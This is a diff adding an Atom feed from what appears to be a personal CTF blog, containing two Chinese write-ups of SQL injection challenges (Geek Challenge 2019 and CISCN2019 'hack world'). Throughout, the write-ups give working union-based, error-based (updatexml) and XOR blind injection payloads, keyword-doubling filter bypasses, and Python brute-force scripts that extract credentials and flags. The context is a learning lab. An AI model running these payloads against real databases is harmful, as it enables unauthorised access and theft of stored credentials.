@@ -1,0 +1,184 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-17T18:47:18+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">极客大挑战2019 - SQLI</title><link href="http://localhost:4000/ctf/geekchall/" rel="alternate" type="text/html" title="极客大挑战2019 - SQLI" /><published>2020-01-08T00:00:00+08:00</published><updated>2020-01-08T00:00:00+08:00</updated><id>http://localhost:4000/ctf/geekchall</id><content type="html" xml:base="http://localhost:4000/ctf/geekchall/"><![CDATA[<h2 id="题目描述">题目描述</h2>
+
+<p>极客大挑战2019的sql注入系列一共有5个题目，感觉非常有意思啊，就好像自己化身为了一名黑客</p>
+
+<h2 id="easysql">EasySQL</h2>
+
+<p>这题没什么好说的，万能密码一试就成功了</p>
+
+<p><img src="/images/ctf/geekchall/0.jpg" alt="" /></p>
+
+<p>网站做的确实非常精湛！！</p>
+
+<p><img src="/images/ctf/geekchall/1.jpg" alt="" /></p>
+
+<h2 id="lovesql">LoveSQL</h2>
+<p>用上面的万能密码登录进去后，没有flag，而是给出了一串密码，让人不禁联想到sql查询。在加上登录界面的提示，可以判断flag应该在数据库的某个地方</p>
+
+<p><img src="/images/ctf/geekchall/2.jpg" alt="" /></p>
+
+<p>接下来在输入用户名处拼接常规的sql注入语句就行了，payload可以参考</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span><span class="err">爆出所有库名</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">distinct</span> <span class="n">table_schema</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span>
+<span class="o">#</span><span class="err">爆出数据库</span><span class="n">news</span><span class="err">的所有表名</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">distinct</span> <span class="k">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="n">table_schema</span> <span class="o">=</span> <span class="s1">'news'</span>
+<span class="o">#</span><span class="err">爆出表</span><span class="k">admin</span><span class="err">的所有列</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">distinct</span> <span class="k">column_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="k">table_name</span> <span class="o">=</span> <span class="s1">'admin'</span>
+<span class="o">#</span><span class="err">查</span><span class="n">username</span><span class="err">和</span><span class="n">password</span><span class="err">，中间用</span><span class="p">:</span><span class="err">隔开</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">from</span> <span class="k">admin</span>
+</code></pre></div></div>
+
+<h2 id="babysql">BabySQL</h2>
+<p>这题应该才是我真正想写的一题。这题确实和登录界面说的一样，和之前的不同，做了严格的过滤。（2333</p>
+
+<p><img src="/images/ctf/geekchall/3.jpg" alt="" /></p>
+
+<p>稍微看仔细点，就能发现很多关键单词比如or、where、select等都被替换为空了。解决的方法很简单，因为这道题只替换了一次，所以可以在一个单词里再写一个这个单词，比如把or写成oorr，就可以绕过这个“严格”的过滤了</p>
+
+<p><img src="/images/ctf/geekchall/4.jpg" alt="" /></p>
+
+<p>查当前库名</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,database()#
+</span></code></pre></div></div>
+<p>爆出所有表</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,group_concat(distinct table_name) frfromom infoorrmation_schema.columns whwhereere table_schema = '</span><span class="n">geek</span><span class="s1">'#
+</span></code></pre></div></div>
+<p>爆出所有列</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,group_concat(distinct column_name) frfromom infoorrmation_schema.columns whwhereere table_name = '</span><span class="n">b4bsql</span><span class="s1">'#
+</span></code></pre></div></div>
+<p>爆字段</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,group_concat(id,0x3a,username,0x3a,passwoorrd) frofromm b4bsql#
+</span></code></pre></div></div>
+
+<h2 id="hardsql">HardSQL</h2>
+<p>一开始先简单测试一下，发现过滤了空格，而且怎么绕都绕不过去，然后去网上找wp发现是报错注入。值得注意的是这里用到了一个还没见过的新操作,用’^’来连接updatexml函数，结合了异或</p>
+
+<p>查当前数据库名</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)#
+</span></code></pre></div></div>
+<p>查表名</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('</span><span class="n">geek</span><span class="s1">'))),0x7e),1)#
+</span></code></pre></div></div>
+<p>查列名</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('</span><span class="n">H4rDsq1</span><span class="s1">'))),0x7e),1)#
+</span></code></pre></div></div>
+<p>最后这里查flag内容的时候，由于updtexml最多显示32的长度，导致flag显示不全。然后用substr截取一下，发现substr被过滤了，于是上网找了另一种操作，用left和right截取函数分两次得到了完整的flag</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1)#
+</span></code></pre></div></div>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1)#
+</span></code></pre></div></div>
+
+<h2 id="finalsql">FinalSQL</h2>
+<p>这道题和之前的题不太一样，可以看到给出了5个紫色的选项，分别对应着5个不同的id，但是这几个id都没什么用</p>
+
+<p><img src="/images/ctf/geekchall/5.jpg" alt="" /></p>
+
+<p>试着在用户名和密码处进行注入，但是发现用户名和密码处有严格的过滤，大部分SQL注入的关键词都被过滤了</p>
+
+<p><img src="/images/ctf/geekchall/6.jpg" alt="" /></p>
+
+<p>然后尝试在上面的那几个id处进行注入，发现空格也被过滤了，和上面的hardsql一样绕不过去，那么用上面hardsql的报错注入语句试试</p>
+
+<p><img src="/images/ctf/geekchall/7.jpg" alt="" /></p>
+
+<p>发现有东西被过滤了，测试了一下发现被过滤的是0x7e，把它改成~反而绕过了过滤，然后再试试</p>
+
+<p><img src="/images/ctf/geekchall/8.jpg" alt="" /></p>
+
+<p>然而可能是界面处理的比较好，并没有报错出什么有用的信息。主界面有个小提示，出现了SQL盲注的字样，那么来尝试一下盲注吧</p>
+
+<p>结合异或注入的小技巧，构造id=1^1^1, 返回id=1的结果</p>
+
+<p><img src="/images/ctf/geekchall/9.jpg" alt="" /></p>
+
+<p>id=1^0^1，返回id=0的结果（注意是三个感叹号）</p>
+
+<p><img src="/images/ctf/geekchall/10.jpg" alt="" /></p>
+
+<p>那么构造 id = 1^(length(database())&gt;3)^1，返回的是id=1的结果，即(length(database())&gt;3) = 1，是真的，说明当前数据库的长度大于3</p>
+
+<p><img src="/images/ctf/geekchall/11.jpg" alt="" /></p>
+
+<p>根据这个原理，构造id=1^(ascii(substr((select(database())),1,1))&gt;<strong>100</strong>)^1, 不停的改变100那里的数值，即可判断出当前数据库的第一个字符是什么</p>
+
+<p>然后可以借助burpsuite的intruder模块，试出数据库名，表名等。也可以写python脚本，如果数据太长的话，不写脚本是很慢的。这里给出最后已经查出了表名(F1naI1y，而且根据前几题sql题知道放flag的列都是password)之后查flag的脚本</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://c1e6b438-7a2c-47fd-9473-96e47707df3a.node3.buuoj.cn/search.php</span><span class="sh">"</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">180</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">128</span><span class="p">):</span>
+        <span class="n">d</span> <span class="o">=</span> <span class="sh">"</span><span class="s">?id=1^(ascii(substr((select(group_concat(distinct(password)))from(F1naI1y)),</span><span class="sh">'"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="sh">"'</span><span class="s">,1))=</span><span class="sh">'"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="sh">"'</span><span class="s">)^1</span><span class="sh">"</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">d</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sh">'</span><span class="s">Click</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">j</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
+</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;ctf&quot;]" /><category term="sqli" /><category term="web" /><category term="ctf" /><summary type="html"><![CDATA[题目描述]]></summary></entry><entry><title type="html">Ciscn2019 华北赛区 day2 web1 - hack world</title><link href="http://localhost:4000/ctf/hackworld/" rel="alternate" type="text/html" title="Ciscn2019 华北赛区 day2 web1 - hack world" /><published>2019-12-27T00:00:00+08:00</published><updated>2019-12-27T00:00:00+08:00</updated><id>http://localhost:4000/ctf/hackworld</id><content type="html" xml:base="http://localhost:4000/ctf/hackworld/"><![CDATA[<h2 id="0x01-题目描述">0x01 题目描述</h2>
+
+<p><img src="/images/ctf/hackworld/0.jpg" alt="" /></p>
+
+<p>很明显这是一道sql注入的题目，已经给出了flag所在的列名和表名，且提供一个id查询的功能。当提交1和2的时候，查询出了两句骚话</p>
+
+<p><code class="language-plaintext highlighter-rouge">Hello, glzjin wants a girlfriend.</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">Do you want to be my girlfriend?</code></p>
+
+<h2 id="0x02-获取flag">0x02 获取flag</h2>
+<p>尝试输入一些常规的sql注入语句，结果都被过滤了，尝试异或注入，输入1^1^1，返回了id=1的结果</p>
+
+<p><img src="/images/ctf/hackworld/1.jpg" alt="" /></p>
+
+<p>SQL中的^是异或判断，当^两边相同的时候，其值为0，当^两边不相同时，其值为1</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1^1<span class="o">=</span>0  1^2<span class="o">=</span>1
+</code></pre></div></div>
+
+<p>所以我们可以通过输入<code class="language-plaintext highlighter-rouge">1^(ascii(substr((select(flag)from(flag)),1,1))&gt;x)^1</code>，不断改变x的值，根据回显逐渐爆破出flag的值。因为本萌新还不会写脚本，所以用了一下赵师傅的脚本</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://web43.buuoj.cn/index.php</span><span class="sh">"</span>
+
+<span class="n">result</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">38</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sh">'</span><span class="s">1^(cot(ascii(substr((select(flag)from(flag)),</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">,1))&gt;</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">))^1=1</span><span class="sh">'</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+
+        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">girl</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="n">result</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+            <span class="k">break</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>跑了一下不知道哪里错了，但是还是很有学习价值。在网上找了另一个大佬的脚本，用二分法成功跑出了flag</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://d5d88314-27e4-43cf-a7b4-802508698555.node3.buuoj.cn/index.php</span><span class="sh">"</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+	<span class="sh">"</span><span class="s">id</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">""</span>
+<span class="p">}</span>
+<span class="n">result</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
+	<span class="n">l</span> <span class="o">=</span> <span class="mi">33</span>
+	<span class="n">r</span> <span class="o">=</span><span class="mi">130</span>
+	<span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">+</span><span class="n">r</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">1</span>
+	<span class="nf">while</span><span class="p">(</span><span class="n">l</span><span class="o">&lt;</span><span class="n">r</span><span class="p">):</span>
+		<span class="n">payload</span><span class="p">[</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0^</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">(ascii(substr((select(flag)from(flag)),{0},1))&gt;{1})</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mid</span><span class="p">)</span>
+		<span class="n">html</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+		<span class="nf">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+		<span class="k">if</span> <span class="sh">"</span><span class="s">Hello</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">html</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+			<span class="n">l</span> <span class="o">=</span> <span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="n">r</span> <span class="o">=</span> <span class="n">mid</span>
+		<span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">+</span><span class="n">r</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">1</span>
+	<span class="nf">if</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span><span class="o">==</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">):</span>
+		<span class="k">break</span>
+	<span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
+	<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">flag: </span><span class="sh">"</span> <span class="p">,</span><span class="n">result</span><span class="p">)</span>
+</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;ctf&quot;]" /><category term="sqli" /><category term="web" /><category term="ctf" /><summary type="html"><![CDATA[0x01 题目描述]]></summary></entry></feed>
